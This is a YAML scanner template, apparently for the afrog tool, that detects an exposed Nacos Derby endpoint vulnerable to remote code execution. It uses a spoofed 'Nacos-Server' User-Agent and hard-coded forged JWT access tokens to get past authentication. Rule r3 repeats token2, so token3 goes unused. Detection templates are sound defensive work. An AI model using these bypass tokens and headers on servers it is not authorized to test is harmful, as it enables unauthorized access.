id: nacos-derby-rce

info:
  name: Nacos Derby 远程代码执行 RCE
  author: zan8in
  severity: critical
  verified: true
  reference:
    - https://github.com/Wileysec/nacos_derby_rce
  tags: nacos,derby,rce
  created: 2024/07/20

set:
  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
  token2: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk
  token3: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ
rules:
  r0:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby
      headers:
        User-Agent: "Nacos-Server"
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")
  r1:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?&accessToken={{token}}
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")
  r2:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?&accessToken={{token2}}
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")
  r3:
    request:
      method: GET
      path: /nacos/v1/cs/ops/derby?&accessToken={{token2}}
    expression: |
      response.status == 500 && response.body.bcontains(b"caused: Required request parameter")

extractors:
  - type: word
    extractor:
      tips: "Manual verification is needed (需要人工验证)"
expression: r0() || r1() || r2() || r3()
